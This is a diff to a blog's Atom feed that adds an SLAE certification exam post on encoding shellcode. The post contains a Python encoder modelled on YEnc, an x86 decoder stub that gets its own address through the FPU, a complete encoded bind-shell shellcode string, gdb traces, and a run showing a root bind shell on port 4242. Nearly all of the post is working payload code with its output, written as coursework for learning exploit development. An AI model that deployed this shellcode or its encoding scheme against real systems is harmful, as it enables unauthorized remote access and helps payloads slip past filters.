@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Slae | tcunha.github.io]]></title>
   <link href="http://tcunha.github.io/blog/categories/slae/atom.xml" rel="self"/>
   <link href="http://tcunha.github.io/"/>
-  <updated>2018-07-12T20:51:38+00:00</updated>
+  <updated>2018-07-14T09:26:17+00:00</updated>
   <id>http://tcunha.github.io/</id>
   <author>
     <name><![CDATA[tcunha]]></name>
@@ -12,6 +12,291 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SLAE 0x04: Encoder]]></title>
+    <link href="http://tcunha.github.io/blog/2018/07/12/slae-0x04-encoder/"/>
+    <updated>2018-07-12T20:57:49+00:00</updated>
+    <id>http://tcunha.github.io/blog/2018/07/12/slae-0x04-encoder</id>
+    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>This one details the use of an encoding scheme to encode the shellcode with and decode it subsequently on runtime.</p>
+
+<p>I&rsquo;ve decided to use <a href="http://www.yenc.org/yenc-draft.1.3.txt">YEnc</a> (draft 1.3). YEnc is used to encode binary data to be transmitted by email or newsgroups and uses the complete 8-bit character set, thus making its output only 1-2% larger than the original.</p>
+
+<p>Basically, the encoding process consists of for any given character, increment its ASCII value by 42, modulo 256. Next, if the resulting character is a forbidden one (0x00, 0x0a, 0x0d and 0x3d), output the escape 0x3d character and increment the previous resulting character by 64, modulo 256.</p>
+
+<p>The encoder does not strictly follow the draft, since it will not use the header, trailer and the CRC32 checksum.</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+# Follows YEnc draft 1.3 with regards to the encoding process. No header or
+# trailer will be used by the decoder, nor will the CRC32.
+#
+# An encoded character is equal to its original ASCII value plus 42, modulo 256.
+# In case of a special character is detected (0x00, 0x0a, 0x0d and 0x3d), the
+# resulting encoded character is prefixed with the escape 0x3d character and its
+# already encoded result (with the above) will be incremented 64, modulo 256.
+
+import sys
+
+if len(sys.argv) == 1:
+    sys.exit("usage: opcodes")
+print "Original shellcode size: " + str(len(sys.argv[1]))
+
+enc = list()
+for c in sys.argv[1]:
+    c = (ord(c) + 42) % 256
+    if c == 0x00 or c == 0x0a or c == 0x0d or c == 0x3d:
+        enc.append(hex(61))
+        c = (c + 64) % 256                  # critical character; double encode
+    enc.append(hex(c))                      # regular character
+
+print "Encoded shellcode size: " + str(len(enc))
+print ",".join(enc)
+</code></pre>
+
+<pre><code class="bash encoder in action">$ opcodes=`asm-opcodes ../0x01-bind/bind`; ./encoder.py `echo -e $opcodes`
+Original shellcode size: 82
+Encoded shellcode size: 83
+0x5b,0xea,0x5b,0x20,0xc3,0x90,0xe2,0x91,0x2b,0x94,0x2c,0x85,0x94,0x2b,0x83,0xf7,0xaa,0xbd,0x90,0xe2,0x93,0x2b,0x80,0x90,0x92,0x3a,0xbc,0x90,0x94,0x2c,0xb3,0xb,0x94,0x3a,0x84,0xf7,0xaa,0x90,0xe2,0x95,0x2b,0x5b,0xf3,0xf7,0xaa,0x21,0xb,0x90,0xe2,0x96,0x2b,0xf7,0xaa,0xbd,0x6b,0x6b,0x94,0x69,0x82,0xf7,0xaa,0x73,0xa3,0x22,0x7a,0xda,0x35,0x92,0x98,0x59,0x9d,0x92,0x92,0x59,0x59,0x8c,0x93,0xb3,0x3d,0x4d,0x6b,0xf7,0xaa
+</code></pre>
+
+<p>The resulting shellcode is using the FPU <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="(https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the shellcode. Due to the decoding process having to discard the escape characters, it is also pushing the final decoded characters to the stack instead of the data section, where it would imply having to overwrite the escape characters:</p>
+
+<pre><code class="asm">global _start
+
+section .text
+_start:
+    xor ecx, ecx
+    mul ecx                         ; make eax and edx zero, as well
+
+    fldz                            ; retrieve shellcode address via fldz
+    jmp decoder_pc
+
+    ; the shellcode address is 4 bytes below of fldz
+    decoder_shellcode: db SHELLCODE
+    ; get the shellcode length by using the $ identifier (which evaluates to
+    ; the current address)
+    decoder_length: equ $ - decoder_shellcode
+
+decoder_pc:
+    ; the FPU structure in memory contains the address of the last FPU
+    ; instruction on byte 0xc (the previous 3 bytes are composed of the
+    ; control, status and tag word)
+    fstenv [esp - 0xc]
+    pop eax
+    lea esi, [eax + 0x4]            ; the shellcode is 4 bytes below
+
+    mov cl, decoder_length
+decoder_loop:
+    cmp byte [esi], 0x3d            ; check if it is a regular character
+    jnz decoder_regular             ; not an escaped character
+
+    inc esi                         ; grab the next character, instead
+    sub byte [esi], 0x40            ; per the draft, subtract 0x40
+    dec ecx                         ; the escape character was skipped
+decoder_regular:
+    sub byte [esi], 0x2a            ; per the draft, subtract 0x2a
+    mov al, [esi]                   ; can't mov m8, m8
+    mov [esp], al                   ; move decoded character to the stack
+    inc esi                         ; go to the next character
+    inc esp                         ; increase stack for the next one
+    inc edx                         ; save number of copied characters
+    loop decoder_loop
+
+    ; before jumping to the stack, its pointer needs to be adjusted by the
+    ; number of copied characters; besides this also avoids the shellcode
+    ; potentially overwriting itself with push instructions
+    sub esp, edx
+    jmp esp                         ; finally jump to the shellcode
+</code></pre>
+
+<p>As usual, the configure script in the base directory can be used to tweak the code. In this case, the new -s command-line option should point to the shellcode to encode:</p>
+
+<pre><code class="bash">$ ./configure -s 0x02-reverse/reverse
+Using listening port: 0x9210
+Using remote host: 0x0101017f
+Using remote port: 0x9210
+Using shellcode: 0x02-reverse/reverse
+$ ./configure
+Using listening port: 0x9210
+Using remote host: 0x0101017f
+Using remote port: 0x9210
+Using shellcode: 0x01-bind/bind
+$ cd 0x04-encoder/
+$ make
+nasm  -f elf32 -o decoder.o decoder.asm
+ld -N -zexecstack -o decoder decoder.o
+08048080 &lt;_start&gt;:
+ 8048080:       31 c9                   xor    ecx,ecx
+ 8048082:       f7 e1                   mul    ecx
+ 8048084:       d9 ee                   fldz
+ 8048086:       eb 53                   jmp    80480db &lt;decoder_pc&gt;
+
+08048088 &lt;decoder_shellcode&gt;:
+ 8048088:       5b                      pop    ebx
+ 8048089:       ea 5b 20 c3 90 e2 91    jmp    0x91e2:0x90c3205b
+ 8048090:       2b 94 2c 85 94 2b 83    sub    edx,DWORD PTR [esp+ebp*1-0x7cd46b7b]
+ 8048097:       f7 aa bd 90 e2 93       imul   DWORD PTR [edx-0x6c1d6f43]
+ 804809d:       2b 80 90 92 3a bc       sub    eax,DWORD PTR [eax-0x43c56d70]
+ 80480a3:       90                      nop
+ 80480a4:       94                      xchg   esp,eax
+ 80480a5:       2c b3                   sub    al,0xb3
+ 80480a7:       0b 94 3a 84 f7 aa 90    or     edx,DWORD PTR [edx+edi*1-0x6f55087c]
+ 80480ae:       e2 95                   loop   8048045 &lt;decoder_length+0x8047ff2&gt;
+ 80480b0:       2b 5b f3                sub    ebx,DWORD PTR [ebx-0xd]
+ 80480b3:       f7 aa 21 0b 90 e2       imul   DWORD PTR [edx-0x1d6ff4df]
+ 80480b9:       96                      xchg   esi,eax
+ 80480ba:       2b f7                   sub    esi,edi
+ 80480bc:       aa                      stos   BYTE PTR es:[edi],al
+ 80480bd:       bd 6b 6b 94 69          mov    ebp,0x69946b6b
+ 80480c2:       82 f7 aa                xor    bh,0xaa
+ 80480c5:       73 a3                   jae    804806a &lt;decoder_length+0x8048017&gt;
+ 80480c7:       22 7a da                and    bh,BYTE PTR [edx-0x26]
+ 80480ca:       35 92 98 59 9d          xor    eax,0x9d599892
+ 80480cf:       92                      xchg   edx,eax
+ 80480d0:       92                      xchg   edx,eax
+ 80480d1:       59                      pop    ecx
+ 80480d2:       59                      pop    ecx
+ 80480d3:       8c 93 b3 3d 4d 6b       mov    WORD PTR [ebx+0x6b4d3db3],ss
+ 80480d9:       f7                      .byte 0xf7
+ 80480da:       aa                      stos   BYTE PTR es:[edi],al
+
+080480db &lt;decoder_pc&gt;:
+ 80480db:       9b d9 74 24 f4          fstenv [esp-0xc]
+ 80480e0:       58                      pop    eax
+ 80480e1:       8d 70 04                lea    esi,[eax+0x4]
+ 80480e4:       b1 53                   mov    cl,0x53
+
+080480e6 &lt;decoder_loop&gt;:
+ 80480e6:       80 3e 3d                cmp    BYTE PTR [esi],0x3d
+ 80480e9:       75 05                   jne    80480f0 &lt;decoder_regular&gt;
+ 80480eb:       46                      inc    esi
+ 80480ec:       80 2e 40                sub    BYTE PTR [esi],0x40
+ 80480ef:       49                      dec    ecx
+
+080480f0 &lt;decoder_regular&gt;:
+ 80480f0:       80 2e 2a                sub    BYTE PTR [esi],0x2a
+ 80480f3:       8a 06                   mov    al,BYTE PTR [esi]
+ 80480f5:       88 04 24                mov    BYTE PTR [esp],al
+ 80480f8:       46                      inc    esi
+ 80480f9:       44                      inc    esp
+ 80480fa:       42                      inc    edx
+ 80480fb:       e2 e9                   loop   80480e6 &lt;decoder_loop&gt;
+ 80480fd:       29 d4                   sub    esp,edx
+ 80480ff:       ff e4                   jmp    esp
+Shellcode size: 129
+\x31\xc9\xf7\xe1\xd9\xee\xeb\x53\x5b\xea\x5b\x20\xc3\x90\xe2\x91\x2b\x94\x2c\x85\x94\x2b\x83\xf7\xaa\xbd\x90\xe2\x93\x2b\x80\x90\x92\x3a\xbc\x90\x94\x2c\xb3\x0b\x94\x3a\x84\xf7\xaa\x90\xe2\x95\x2b\x5b\xf3\xf7\xaa\x21\x0b\x90\xe2\x96\x2b\xf7\xaa\xbd\x6b\x6b\x94\x69\x82\xf7\xaa\x73\xa3\x22\x7a\xda\x35\x92\x98\x59\x9d\x92\x92\x59\x59\x8c\x93\xb3\x3d\x4d\x6b\xf7\xaa\x9b\xd9\x74\x24\xf4\x58\x8d\x70\x04\xb1\x53\x80\x3e\x3d\x75\x05\x46\x80\x2e\x40\x49\x80\x2e\x2a\x8a\x06\x88\x04\x24\x46\x44\x42\xe2\xe9\x29\xd4\xff\xe4
+cc -DSHELLCODE=`asm-opcodes decoder` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
+</code></pre>
+
+<p>Debugging with gdb(1) shows that the absolute address of the shellcode is correctly retrieved, since the address of the last FPU instruction is 0x08048084, thus putting the encoded shellcode 4 bytes below in 0x08048088:</p>
+
+<pre><code class="bash debugging with gdb(1)">$ gdb -q decoder
+Reading symbols from decoder...(no debugging symbols found)...done.
+(gdb) b _start
+Breakpoint 1 at 0x8048080
+(gdb) r
+Starting program: /attic/slae/exam/0x04-encoder/decoder
+Dump of assembler code for function _start:
+=&gt; 0x08048080 &lt;+0&gt;:     xor    ecx,ecx
+   0x08048082 &lt;+2&gt;:     mul    ecx
+   0x08048084 &lt;+4&gt;:     fldz
+   0x08048086 &lt;+6&gt;:     jmp    0x80480db &lt;decoder_pc&gt;
+End of assembler dump.
+$1 = [ IF ]
+
+Breakpoint 1, 0x08048080 in _start ()
+(gdb) disass decoder_pc
+Dump of assembler code for function decoder_pc:
+   0x080480db &lt;+0&gt;:     fstenv [esp-0xc]
+   0x080480e0 &lt;+5&gt;:     pop    eax
+   0x080480e1 &lt;+6&gt;:     lea    esi,[eax+0x4]
+   0x080480e4 &lt;+9&gt;:     mov    cl,0x53
+End of assembler dump.
+(gdb) b *decoder_pc+6
+Breakpoint 2 at 0x80480e1
+(gdb) continue
+Continuing.
+Dump of assembler code for function decoder_pc:
+   0x080480db &lt;+0&gt;:     fstenv [esp-0xc]
+   0x080480e0 &lt;+5&gt;:     pop    eax
+=&gt; 0x080480e1 &lt;+6&gt;:     lea    esi,[eax+0x4]
+   0x080480e4 &lt;+9&gt;:     mov    cl,0x53
+End of assembler dump.
+$2 = [ PF IF ]
+
+Breakpoint 2, 0x080480e1 in decoder_pc ()
+(gdb) i r eax
+eax            0x8048084        134512772
+(gdb) x/i $eax
+   0x8048084 &lt;_start+4&gt;:        fldz
+(gdb) x/4x decoder_shellcode
+0x8048088 &lt;decoder_shellcode&gt;:  0x205bea5b      0x91e290c3      0x852c942b      0xf7832b94
+(gdb) x/4x $eax+4
+0x8048088 &lt;decoder_shellcode&gt;:  0x205bea5b      0x91e290c3      0x852c942b      0xf7832b94
+(gdb) disass decoder_regular
+Dump of assembler code for function decoder_regular:
+   0x080480f0 &lt;+0&gt;:     sub    BYTE PTR [esi],0x2a
+   0x080480f3 &lt;+3&gt;:     mov    al,BYTE PTR [esi]
+   0x080480f5 &lt;+5&gt;:     mov    BYTE PTR [esp],al
+   0x080480f8 &lt;+8&gt;:     inc    esi
+   0x080480f9 &lt;+9&gt;:     inc    esp
+   0x080480fa &lt;+10&gt;:    inc    edx
+   0x080480fb &lt;+11&gt;:    loop   0x80480e6 &lt;decoder_loop&gt;
+   0x080480fd &lt;+13&gt;:    sub    esp,edx
+   0x080480ff &lt;+15&gt;:    jmp    esp
+End of assembler dump.
+(gdb) b *0x080480ff
+Breakpoint 3 at 0x80480ff
+(gdb) continue
+Continuing.
+Dump of assembler code for function decoder_regular:
+   0x080480f0 &lt;+0&gt;:     sub    BYTE PTR [esi],0x2a
+   0x080480f3 &lt;+3&gt;:     mov    al,BYTE PTR [esi]
+   0x080480f5 &lt;+5&gt;:     mov    BYTE PTR [esp],al
+   0x080480f8 &lt;+8&gt;:     inc    esi
+   0x080480f9 &lt;+9&gt;:     inc    esp
+   0x080480fa &lt;+10&gt;:    inc    edx
+   0x080480fb &lt;+11&gt;:    loop   0x80480e6 &lt;decoder_loop&gt;
+   0x080480fd &lt;+13&gt;:    sub    esp,edx
+=&gt; 0x080480ff &lt;+15&gt;:    jmp    esp
+End of assembler dump.
+$3 = [ PF SF IF ]
+
+Breakpoint 3, 0x080480ff in decoder_regular ()
+(gdb) x/10i $esp
+   0xbffff714:  xor    eax,eax
+   0xbffff716:  xor    esi,esi
+   0xbffff718:  cdq
+   0xbffff719:  mov    ax,0x167
+   0xbffff71d:  push   0x2
+   0xbffff71f:  pop    ebx
+   0xbffff720:  push   0x1
+   0xbffff722:  pop    ecx
+   0xbffff723:  int    0x80
+   0xbffff725:  xchg   ebx,eax
+</code></pre>
+
+<p>Given the above, the shellcode is being correctly decoded on the stack. Executing it yields a bind shell:</p>
+
+<pre><code class="bash executing the shellcode"># ./shellcode
+Shellcode length: 129
+$ ss -nlt|grep 4242
+LISTEN     0      0            *:4242                     *:*
+$ nc -v 127.0.0.1 4242
+Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[SLAE 0x03: Egghunter]]></title>
